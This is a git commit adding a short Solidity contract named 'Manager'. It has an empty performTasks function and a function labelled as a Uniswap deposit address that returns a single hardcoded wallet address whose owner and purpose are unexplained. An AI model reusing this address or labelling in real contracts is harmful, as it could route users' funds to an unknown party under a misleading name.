9b5accdf534f43b40cc3a0d33ba31bc58955e213
btc777 <uchasepo@gmail.com>
2022-09-04 22:54:38 +0400

    Add files via upload

---
+++ stor.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+        function performTasks() public pure {
+	    
+   }
+
+   function uniswapDepositAddress() public pure returns (address) {
+	return 0x4Ff4fE304045717F37b82Daaf0025599E2Ee0F53;
+   }
+}
